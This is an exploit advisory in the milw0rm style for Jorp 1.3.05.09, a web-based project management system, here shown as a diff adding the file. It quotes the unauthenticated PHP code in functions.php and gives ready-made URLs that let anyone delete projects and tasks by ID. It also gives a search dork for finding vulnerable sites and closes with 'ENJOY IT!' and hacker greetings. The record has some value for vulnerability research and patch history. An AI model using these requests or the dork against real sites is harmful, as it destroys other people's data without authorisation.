@@ -1,0 +1,117 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	   (GET vars 'x' & 'y') ADMIN FUNCTION EXECUTION	     	     |
+|--------------------------------------------------------------------------------------------|
+|                         	| 	  Jorp v-1.3.05.09       |		 	     |
+|  CMS INFORMATION:		 --------------------------------		             |
+|										             |
+|-->WEB: http://jorp.sourceforge.net/           				             |
+|-->DOWNLOAD: http://jorp.sourceforge.net/			            	             |
+|-->DEMO: http://jorp.short-stack.net/demo/						     |
+|-->CATEGORY: Project Management							     |
+|-->DESCRIPTION: Jorp is a simple, web-based project management system.		       	     |
+|		It allows you to keep track of projects, tasks, clients,...		     |
+|-->RELEASED: 2009-05-07								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3								     |
+|-->DORK: "2009 Jorp"								             |
+|-->CATEGORY: ADMIN FUNCTION EXECUTION						             |
+|-->AFFECT VERSION: 1.3.05.09 (maybe <= ?)			 			     |
+|-->Discovered Bug date: 2009-05-09							     |
+|-->Reported Bug date: 2009-05-09							     |
+|-->Fixed bug date: 2009-05-12								     |
+|-->Info patch: http://jorp.sourceforge.net/					             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+##############################
+//////////////////////////////
+
+ADMIN FUNCTION EXECUTION:
+
+/////////////////////////////
+##############################
+
+
+Description: it's possible to remove Projects and Tasks remotely (without admin account).
+
+
+-----------
+FILE VULN:
+-----------
+
+Description: GET var 'x' injects the function deleteProject or deleteTask and GET var 'y' points to
+ID.
+
+Path --> [HOME_PATH]/functions.php
+
+Lines --> 5-18
+
+Code:
+
+...
+
+if (isset($_GET['x'])){	
+	$x=$_GET['x'];	
+}	
+if (isset($_GET['y'])){		
+	$y=$_GET['y'];	}	
+if ($x == 'deleteProject')		
+	deleteProject($y);	
+else if ($x == 'deleteTask')		
+	deleteTask($y);
+...
+
+---------
+EXPLOIT:
+---------
+
+
+--->http://[HOST]/[HOME_PATH]/functions.php?x=deleteProject&y=[ID]
+
+--->http://[HOST]/[HOME_PATH]/functions.php?x=deleteTask&y=[ID]
+
+
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+#######################################################################
+#######################################################################
+##*******************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!  ##
+##*******************************************************************##
+##-------------------------------------------------------------------##
+##*******************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray and Spanish Hack3Rs community!##
+##*******************************************************************##
+#######################################################################
+#######################################################################
+
+# milw0rm.com [2009-05-20]
